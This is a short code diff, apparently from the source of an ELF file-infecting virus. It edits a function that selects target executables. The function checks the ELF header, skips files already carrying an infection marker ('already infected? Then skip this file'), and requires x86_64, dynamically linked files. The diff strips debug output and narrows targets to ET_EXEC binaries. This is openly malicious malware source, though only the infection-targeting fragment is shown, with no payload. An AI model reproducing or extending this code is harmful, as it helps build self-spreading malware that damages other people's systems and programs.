@@ -665,26 +665,20 @@ int check_criteria(char *filename)
 	_close(fd);
 	ehdr = (Elf64_Ehdr *)mem;
 	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
-	if(_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0) {
-		DEBUG_PRINT("not an ELF\n");
+	if(_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0) 
 		return -1;
-	}
 	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
-	if (magic == MAGIC_NUMBER) { //already infected? Then skip this file
-		DEBUG_PRINT("is infected\n");
+	if (magic == MAGIC_NUMBER)  //already infected? Then skip this file
 		return -1;
-	}
-	if (ehdr->e_machine != EM_X86_64) {
-		DEBUG_PRINT("not x86_64\n");
+	if (ehdr->e_type != ET_EXEC) 
 		return -1;
-	}
+	if (ehdr->e_machine != EM_X86_64) 
+		return -1;
 	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++) 
 		if (phdr[i].p_type == PT_DYNAMIC)	
 			dynamic++;
-	if (!dynamic) {
-		DEBUG_PRINT("not dynamic\n");
+	if (!dynamic) 
 		return -1;
-	}
 	return 0;
 
 }
